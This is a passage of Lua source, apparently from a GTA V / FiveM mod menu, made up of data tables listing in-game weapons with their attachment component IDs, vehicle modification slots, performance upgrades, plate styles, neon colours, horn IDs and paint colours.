							name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
						}, {
							name = "~h~~r~> ~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, Barrel = {
						{
							name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_CR_BARREL_01"
						}, {
							name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_CR_BARREL_02"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
						}, {
							name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
						}, {
							name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
						}, {
							name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
						}, {
							name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
						}, {
							name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
						}, {
							name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
						}, {
							name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
						}
					}, Grips = {
						{
							name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
						}
					}
				}
			}, AdvancedRifle = {
				id = "weapon_advancedrifle", name = "~h~~r~> ~s~Advanced Rifle ", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_ADVANCEDRIFLE_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_ADVANCEDRIFLE_CLIP_02"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
						}
					}
				}
			}, SpecialCarbine = {
				id = "weapon_specialcarbine", name = "~h~~r~> ~s~Special Carbine", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_02"
						}, {
							name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_03"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
						}
					}, Grips = {
						{
							name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
						}
					}
				}
			}, SpecialCarbineMkII = {
				id = "weapon_specialcarbine_mk2", name = "~h~~r~> ~s~Special Carbine Mk II", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_02"
						}, {
							name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER"
						}, {
							name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY"
						}, {
							name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING"
						}, {
							name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
						}, {
							name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
						}, {
							name = "~h~~r~> ~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, Barrel = {
						{
							name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_SC_BARREL_01"
						}, {
							name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_SC_BARREL_02"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
						}, {
							name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
						}, {
							name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
						}, {
							name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
						}, {
							name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
						}, {
							name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
						}, {
							name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
						}, {
							name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
						}
					}, Grips = {
						{
							name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
						}
					}
				}
			}, BullpupRifle = {
				id = "weapon_bullpuprifle", name = "~h~~r~> ~s~Bullpup Rifle", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_BULLPUPRIFLE_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_BULLPUPRIFLE_CLIP_02"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
						}
					}, Grips = {
						{
							name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
						}
					}
				}
			}, BullpupRifleMkII = {
				id = "weapon_bullpuprifle_mk2", name = "~h~~r~> ~s~Bullpup Rifle Mk II", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_02"
						}, {
							name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER"
						}, {
							name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY"
						}, {
							name = "~h~~r~> ~s~Armor Piercing Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING"
						}, {
							name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
						}, {
							name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_02_MK2"
						}, {
							name = "~h~~r~> ~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, Barrel = {
						{
							name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_BP_BARREL_01"
						}, {
							name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_BP_BARREL_02"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
						}, {
							name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
						}, {
							name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
						}, {
							name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
						}, {
							name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
						}, {
							name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
						}, {
							name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
						}, {
							name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
						}
					}, Grips = {
						{
							name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
						}
					}
				}
			}, CompactRifle = {
				id = "weapon_compactrifle", name = "~h~~r~> ~s~Compact Rifle", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_02"
						}, {
							name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_03"
						}
					}
				}
			}
		}, LMG = {
			MG = {
				id = "weapon_mg", name = "~h~~r~> ~s~MG", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_MG_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_MG_CLIP_02"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL_02"
						}
					}
				}
			}, CombatMG = {
				id = "weapon_combatmg", name = "~h~~r~> ~s~Combat MG", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_COMBATMG_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_COMBATMG_CLIP_02"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"
						}
					}, Grips = {
						{
							name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
						}
					}
				}
			}, CombatMGMkII = {
				id = "weapon_combatmg_mk2", name = "~h~~r~> ~s~Combat MG Mk II", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_COMBATMG_MK2_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_COMBATMG_MK2_CLIP_02"
						}, {
							name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_TRACER"
						}, {
							name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY"
						}, {
							name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING"
						}, {
							name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_FMJ"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
						}, {
							name = "~h~~r~> ~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"
						}, {
							name = "~h~~r~> ~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
						}
					}, Barrel = {
						{
							name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_MG_BARREL_01"
						}, {
							name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_MG_BARREL_02"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
						}, {
							name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
						}, {
							name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
						}, {
							name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
						}, {
							name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
						}, {
							name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
						}, {
							name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
						}
					}, Grips = {
						{
							name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
						}
					}
				}
			}, GusenbergSweeper = {
				id = "weapon_gusenberg", name = "~h~~r~> ~s~GusenbergSweeper", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_GUSENBERG_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_GUSENBERG_CLIP_02"
						}
					}
				}
			}
		}, Snipers = {
			SniperRifle = {
				id = "weapon_sniperrifle", name = "~h~~r~> ~s~Sniper Rifle", bInfAmmo = false, mods = {
					Sights = {
						{
							name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_LARGE"
						}, {
							name = "~h~~r~> ~s~Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
						}
					}
				}
			}, HeavySniper = {
				id = "weapon_heavysniper", name = "~h~~r~> ~s~Heavy Sniper", bInfAmmo = false, mods = {
					Sights = {
						{
							name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_LARGE"
						}, {
							name = "~h~~r~> ~s~Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"
						}
					}
				}
			}, HeavySniperMkII = {
				id = "weapon_heavysniper_mk2", name = "~h~~r~> ~s~Heavy Sniper Mk II", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_02"
						}, {
							name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY"
						}, {
							name = "~h~~r~> ~s~Armor Piercing Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING"
						}, {
							name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ"
						}, {
							name = "~h~~r~> ~s~Explosive Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Zoom Scope", id = "COMPONENT_AT_SCOPE_LARGE_MK2"
						}, {
							name = "~h~~r~> ~s~Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"
						}, {
							name = "~h~~r~> ~s~Nigt Vision Scope", id = "COMPONENT_AT_SCOPE_NV"
						}, {
							name = "~h~~r~> ~s~Thermal Scope", id = "COMPONENT_AT_SCOPE_THERMAL"
						}
					}, Barrel = {
						{
							name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_SR_BARREL_01"
						}, {
							name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_SR_BARREL_02"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_SR_SUPP_03"
						}, {
							name = "~h~~r~> ~s~Squared Muzzle Brake", id = "COMPONENT_AT_MUZZLE_08"
						}, {
							name = "~h~~r~> ~s~Bell-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_09"
						}
					}
				}
			}, MarksmanRifle = {
				id = "weapon_marksmanrifle", name = "~h~~r~> ~s~Marksman Rifle", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_MARKSMANRIFLE_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_MARKSMANRIFLE_CLIP_02"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
						}
					}, Grips = {
						{
							name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
						}
					}
				}
			}, MarksmanRifleMkII = {
				id = "weapon_marksmanrifle_mk2", name = "~h~~r~> ~s~Marksman Rifle Mk II", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_02"
						}, {
							name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER"
						}, {
							name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY"
						}, {
							name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING"
						}, {
							name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
						}, {
							name = "~h~~r~> ~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
						}, {
							name = "~h~~r~> ~s~Zoom Scope", id = "COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, Barrel = {
						{
							name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_MRFL_BARREL_01"
						}, {
							name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_MRFL_BARREL_02"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
						}, {
							name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
						}, {
							name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
						}, {
							name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
						}, {
							name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
						}, {
							name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
						}, {
							name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
						}, {
							name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
						}
					}, Grips = {
						{
							name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
						}
					}
				}
			}
		}, Heavy = {
			RPG = {
				id = "weapon_rpg", name = "~h~~r~> ~s~RPG", bInfAmmo = false, mods = {}
			}, GrenadeLauncher = {
				id = "weapon_grenadelauncher", name = "~h~~r~> ~s~Grenade Launcher", bInfAmmo = false, mods = {}
			}, GrenadeLauncherSmoke = {
				id = "weapon_grenadelauncher_smoke", name = "~h~~r~> ~s~Grenade Launcher Smoke", bInfAmmo = false, mods = {}
			}, Minigun = {
				id = "weapon_minigun", name = "~h~~r~> ~s~Minigun", bInfAmmo = false, mods = {}
			}, FireworkLauncher = {
				id = "weapon_firework", name = "~h~~r~> ~s~Firework Launcher", bInfAmmo = false, mods = {}
			}, Railgun = {
				id = "weapon_railgun", name = "~h~~r~> ~s~Railgun", bInfAmmo = false, mods = {}
			}, HomingLauncher = {
				id = "weapon_hominglauncher", name = "~h~~r~> ~s~Homing Launcher", bInfAmmo = false, mods = {}
			}, CompactGrenadeLauncher = {
				id = "weapon_compactlauncher", name = "~h~~r~> ~s~Compact Grenade Launcher", bInfAmmo = false, mods = {}
			}, Widowmaker = {
				id = "weapon_rayminigun", name = "~h~~r~> ~s~Widowmaker", bInfAmmo = false, mods = {}
			}
		}, Throwables = {
			Grenade = {
				id = "weapon_grenade", name = "~h~~r~> ~s~Grenade", bInfAmmo = false, mods = {}
			}, BZGas = {
				id = "weapon_bzgas", name = "~h~~r~> ~s~BZ Gas", bInfAmmo = false, mods = {}
			}, MolotovCocktail = {
				id = "weapon_molotov", name = "~h~~r~> ~s~Molotov Cocktail", bInfAmmo = false, mods = {}
			}, StickyBomb = {
				id = "weapon_stickybomb", name = "~h~~r~> ~s~Sticky Bomb", bInfAmmo = false, mods = {}
			}, ProximityMines = {
				id = "weapon_proxmine", name = "~h~~r~> ~s~Proximity Mines", bInfAmmo = false, mods = {}
			}, Snowballs = {
				id = "weapon_snowball", name = "~h~~r~> ~s~Snowballs", bInfAmmo = false, mods = {}
			}, PipeBombs = {
				id = "weapon_pipebomb", name = "~h~~r~> ~s~Pipe Bombs", bInfAmmo = false, mods = {}
			}, Baseball = {
				id = "weapon_ball", name = "~h~~r~> ~s~Baseball", bInfAmmo = false, mods = {}
			}, TearGas = {
				id = "weapon_smokegrenade", name = "~h~~r~> ~s~Tear Gas", bInfAmmo = false, mods = {}
			}, Flare = {
				id = "weapon_flare", name = "~h~~r~> ~s~Flare", bInfAmmo = false, mods = {}
			}
		}, Misc = {
			Parachute = {
				id = "gadget_parachute", name = "~h~~r~> ~s~Parachute", bInfAmmo = false, mods = {}
			}, FireExtinguisher = {
				id = "weapon_fireextinguisher", name = "~h~~r~> ~s~Fire Extinguisher", bInfAmmo = false, mods = {}
			}
		}
	}
	local b8 = false;
	local b9 = false;
	local ba = false;
	local bb = false;
	local bc = nil;
	local bd = {}
	local be = {}
	local bf = nil;
	local bg = false;
	local bh = -1;
	local bi = -1;
	local bj = -1;
	local bk = false;
	local bl = {
		{
			name = "~h~Spoilers", id = 0
		}, {
			name = "~h~Front Bumper", id = 1
		}, {
			name = "~h~Rear Bumper", id = 2
		}, {
			name = "~h~Side Skirt", id = 3
		}, {
			name = "~h~Exhaust", id = 4
		}, {
			name = "~h~Frame", id = 5
		}, {
			name = "~h~Grille", id = 6
		}, {
			name = "~h~Hood", id = 7
		}, {
			name = "~h~Fender", id = 8
		}, {
			name = "~h~Right Fender", id = 9
		}, {
			name = "~h~Roof", id = 10
		}, {
			name = "~h~Vanity Plates", id = 25
		}, {
			name = "~h~Trim", id = 27
		}, {
			name = "~h~Ornaments", id = 28
		}, {
			name = "~h~Dashboard", id = 29
		}, {
			name = "~h~Dial", id = 30
		}, {
			name = "~h~Door Speaker", id = 31
		}, {
			name = "~h~Seats", id = 32
		}, {
			name = "~h~Steering Wheel", id = 33
		}, {
			name = "~h~Shifter Leavers", id = 34
		}, {
			name = "~h~Plaques", id = 35
		}, {
			name = "~h~Speakers", id = 36
		}, {
			name = "~h~Trunk", id = 37
		}, {
			name = "~h~Hydraulics", id = 38
		}, {
			name = "~h~Engine Block", id = 39
		}, {
			name = "~h~Air Filter", id = 40
		}, {
			name = "~h~Struts", id = 41
		}, {
			name = "~h~Arch Cover", id = 42
		}, {
			name = "~h~Aerials", id = 43
		}, {
			name = "~h~Trim 2", id = 44
		}, {
			name = "~h~Tank", id = 45
		}, {
			name = "~h~Windows", id = 46
		}, {
			name = "~h~Livery", id = 48
		}, {
			name = "~h~Horns", id = 14
		}, {
			name = "~h~Wheels", id = 23
		}, {
			name = "~h~Wheel Types", id = "wheeltypes"
		}, {
			name = "~h~Extras", id = "extra"
		}, {
			name = "~h~Neons", id = "neon"
		}, {
			name = "~h~Paint", id = "paint"
		}, {
			name = "~h~Headlights Color", id = "headlight"
		}, {
			name = "~h~Licence Plate", id = "licence"
		}
	}
	local bm = {
		{
			name = "~h~~r~Engine", id = 11
		}, {
			name = "~h~~b~Brakes", id = 12
		}, {
			name = "~h~~g~Transmission", id = 13
		}, {
			name = "~h~~y~Suspension", id = 15
		}, {
			name = "~h~~b~Armor", id = 16
		}
	}
	local bn = {
		{
			name = "~h~Blue on White 2", id = 0
		}, {
			name = "~h~Blue on White 3", id = 4
		}, {
			name = "~h~Yellow on Blue", id = 2
		}, {
			name = "~h~Yellow on Black", id = 1
		}, {
			name = "~h~North Yankton", id = 5
		}
	}
	local bo = {
		{
			name = "~h~Default", id = -1
		}, {
			name = "~h~White", id = 0
		}, {
			name = "~h~Blue", id = 1
		}, {
			name = "~h~Electric Blue", id = 2
		}, {
			name = "~h~Mint Green", id = 3
		}, {
			name = "~h~Lime Green", id = 4
		}, {
			name = "~h~Yellow", id = 5
		}, {
			name = "~h~Golden Shower", id = 6
		}, {
			name = "~h~Orange", id = 7
		}, {
			name = "~h~Red", id = 8
		}, {
			name = "~h~Pony Pink", id = 9
		}, {
			name = "~h~Hot Pink", id = 10
		}, {
			name = "~h~Purple", id = 11
		}, {
			name = "~h~Blacklight", id = 12
		}
	}
	local bp = {
		["Stock Horn"] = -1, ["Truck Horn"] = 1, ["Police Horn"] = 2, ["Clown Horn"] = 3, ["Musical Horn 1"] = 4, ["Musical Horn 2"] = 5, ["Musical Horn 3"] = 6, ["Musical Horn 4"] = 7, ["Musical Horn 5"] = 8, ["Sad Trombone Horn"] = 9, ["Classical Horn 1"] = 10, ["Classical Horn 2"] = 11, ["Classical Horn 3"] = 12, ["Classical Horn 4"] = 13, ["Classical Horn 5"] = 14, ["Classical Horn 6"] = 15, ["Classical Horn 7"] = 16, ["Scaledo Horn"] = 17, ["Scalere Horn"] = 18, ["Salemi Horn"] = 19, ["Scalefa Horn"] = 20, ["Scalesol Horn"] = 21, ["Scalela Horn"] = 22, ["Scaleti Horn"] = 23, ["Scaledo Horn High"] = 24, ["Jazz Horn 1"] = 25, ["Jazz Horn 2"] = 26, ["Jazz Horn 3"] = 27, ["Jazz Loop Horn"] = 28, ["Starspangban Horn 1"] = 28, ["Starspangban Horn 2"] = 29, ["Starspangban Horn 3"] = 30, ["Starspangban Horn 4"] = 31, ["Classical Loop 1"] = 32, ["Classical Horn 8"] = 33, ["Classical Loop 2"] = 34
	}
	local bq = {
		["White"] = {
			255, 255, 255
		}, ["Blue"] = {
			0, 0, 255
		}, ["Electric Blue"] = {
			0, 150, 255
		}, ["Mint Green"] = {
			50, 255, 155
		}, ["Lime Green"] = {
			0, 255, 0
		}, ["Yellow"] = {
			255, 255, 0
		}, ["Golden Shower"] = {
			204, 204, 0
		}, ["Orange"] = {
			255, 128, 0
		}, ["Red"] = {
			255, 0, 0
		}, ["Pony Pink"] = {
			255, 102, 255
		}, ["Hot Pink"] = {
			255, 0, 255
		}, ["Purple"] = {
			153, 0, 153
		}
	}
	local br = {
		{
			name = "~h~Black", id = 0
		}, {
			name = "~h~Carbon Black", id = 147
		}, {
			name = "~h~Graphite", id = 1
		}, {
			name = "~h~Anhracite Black", id = 11
		}, {
			name = "~h~Black Steel", id = 2
		}, {
			name = "~h~Dark Steel", id = 3
		}, {
			name = "~h~Silver", id = 4
		}, {
			name = "~h~Bluish Silver", id = 5
		}, {
			name = "~h~Rolled Steel", id = 6
		}, {
			name = "~h~Shadow Silver", id = 7
		}, {
			name = "~h~Stone Silver", id = 8
		}, {
			name = "~h~Midnight Silver", id = 9
		}, {
			name = "~h~Cast Iron Silver", id = 10
		}, {
			name = "~h~Red", id = 27
		}, {
			name = "~h~Torino Red", id = 28
		}, {
			name = "~h~Formula Red", id = 29
		}, {
			name = "~h~Lava Red", id = 150
		}, {
			name = "~h~Blaze Red", id = 30
		}, {
			name = "~h~Grace Red", id = 31
		}, {
			name = "~h~Garnet Red", id = 32
		}, {
			name = "~h~Sunset Red", id = 33
		}, {
			name = "~h~Cabernet Red", id = 34
		}, {
			name = "~h~Wine Red", id = 143
		}, {
			name = "~h~Candy Red", id = 35
		}, {
			name = "~h~Hot Pink", id = 135
		}, {
			name = "~h~Pfsiter Pink", id = 137
		}, {
			name = "~h~Salmon Pink", id = 136
		}, {
			name = "~h~Sunrise Orange", id = 36
		}, {
			name = "~h~Orange", id = 38
		}, {
			name = "~h~Bright Orange", id = 138
		}, {
			name = "~h~Gold", id = 99
		}, {
			name = "~h~Bronze", id = 90
		}, {
			name = "~h~Yellow", id = 88
		}, {
			name = "~h~Race Yellow", id = 89
		}, {
			name = "~h~Dew Yellow", id = 91
		}, {
			name = "~h~Dark Green", id = 49
		}, {
			name = "~h~Racing Green", id = 50
		}, {
